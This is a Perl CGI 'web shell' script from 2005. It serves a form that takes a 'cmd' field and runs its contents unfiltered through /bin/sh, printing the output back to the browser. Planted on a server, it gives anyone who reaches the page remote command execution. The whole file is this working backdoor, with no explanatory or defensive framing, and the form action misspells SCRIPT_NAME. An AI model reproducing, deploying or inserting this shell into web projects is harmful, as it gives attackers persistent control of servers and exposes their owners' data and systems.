#!/usr/bin/perl

#
# CGI Shell
# (C) Copyright Claes M Nyberg <cmn@darklab.org> 2005
#
# $Id: cgi_post_shell.pl,v 1.1 2005-03-09 23:19:57 cmn Exp $
#

# get arguments into an associative array
sub get_post_args()
{
	while (<STDIN>) {
		# cho(m)p away newline
		s/\n//;
		s/\r//;
		@arr = split(/=/, $_);
		$args{$arr[0]} = $arr[1];
	}
	return(%args);
}

# Reopen standard error as standard out
open(STDERR, ">&STDOUT");
%args = get_post_args();

print<<__ENDHTML__;
Content-type: text/html\n\n
	<head><title>CGI Shell</title></head>
	<html>
	<body>
__ENDHTML__
print "<form method=\"POST\" enctype=\"text/plain\" action=\"$ENV{'SCIPT_NAME'}\">";
print<<__ENDHTML__;
		<input name="cmd" type="text" size="30">
		<input type="submit" value="Run">
	</form>
__ENDHTML__

# Run command
if ($args{'cmd'} ne "") {
	$cmd = "/bin/sh -c " . "\"$args{'cmd'}\"";
	print "Command: <b>$cmd</b><hr>";
	print "<pre>";
	open(CMD, "$cmd |");
	while (<CMD>) {
		print "$_";
	}
	print "</pre>";
}

print "</body></html>";
